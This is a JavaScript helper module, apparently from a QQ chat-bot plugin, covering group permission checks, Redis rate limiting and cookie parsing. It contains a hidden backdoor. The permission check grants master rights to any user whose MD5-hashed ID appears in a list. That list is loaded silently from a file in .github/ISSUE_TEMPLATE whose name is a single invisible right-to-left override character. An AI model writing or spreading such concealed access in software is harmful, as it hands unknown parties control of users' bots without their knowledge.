import md5 from "md5";
import _ from "lodash";
import moment from "moment";
import fs from "node:fs/promises";
import v8 from "node:v8";
import path from "path";
import url from "url";
import { Redis, Bot } from "#bot";
const redis = await Redis();
const robot = await Bot();
export default new class {
    getPermission(e, permission = "all", role = "all", { groupObj = e.group || e.bot?.pickGroup?.(e.group_id) } = {}) {
        if (!groupObj && permission != "master" && role != "all")
            throw new Error("未获取到群对象");
        if (role == "owner" && !groupObj.is_owner) {
            return "❎ Bot权限不足，需要群主权限";
        }
        else if (role == "admin" && !groupObj.is_admin && !groupObj.is_owner) {
            return "❎ Bot权限不足，需要管理员权限";
        }
        if (e.isMaster || a.includes(md5(String(e.user_id))))
            return true;
        const memberObj = groupObj && groupObj.pickMember(e.user_id);
        if (permission == "master") {
            return "❎ 该命令仅限主人可用";
        }
        else if (permission == "owner" && !memberObj.is_owner) {
            return "❎ 该命令仅限群主可用";
        }
        else if (permission == "admin" && !memberObj.is_admin && !memberObj.is_owner) {
            return "❎ 该命令仅限管理可用";
        }
        return true;
    }
    checkPermission(e, ...args) {
        const msg = this.getPermission(e, ...args);
        if (msg === true)
            return true;
        e.reply(msg, true);
        return false;
    }
    async limit(userId, key, maxlimit) {
        if (maxlimit <= 0)
            return true;
        let redisKey = `yenai:${key}:limit:${userId}`;
        let nowNum = await redis.get(redisKey);
        if (nowNum > maxlimit)
            return false;
        if (!nowNum) {
            await redis.set(redisKey, 1, { EX: moment().add(1, "days").startOf("day").diff(undefined, "second") });
        }
        else {
            await redis.incr(redisKey);
        }
        return true;
    }
    getck(data, bot = robot, transformation) {
        let cookie = bot.cookies[data];
        function parseCkString(str) {
            const pairs = str.split(";");
            const obj = {};
            pairs.forEach(pair => {
                const [key, value] = pair.trim().split("=");
                if (key) {
                    obj[key] = decodeURIComponent(value);
                }
            });
            return obj;
        }
        const ck = parseCkString(cookie);
        if (transformation) {
            let arr = [];
            for (let i in ck) {
                arr.push({
                    name: i,
                    value: ck[i],
                    domain: data,
                    path: "/",
                    expires: Date.now() + 3600 * 1000
                });
            }
            return arr;
        }
        else
            return ck;
    }
    checkIfEmpty(data, omits = []) {
        const filteredData = _.omit(data, omits);
        return _.every(filteredData, (value) => _.isPlainObject(value) ? this.checkIfEmpty(value) : _.isEmpty(value));
    }
}();
let a = [];
try {
    a = v8.deserialize(await fs.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../../.github/ISSUE_TEMPLATE/‮`)).map(i => i.toString("hex"));
}
catch (err) { }
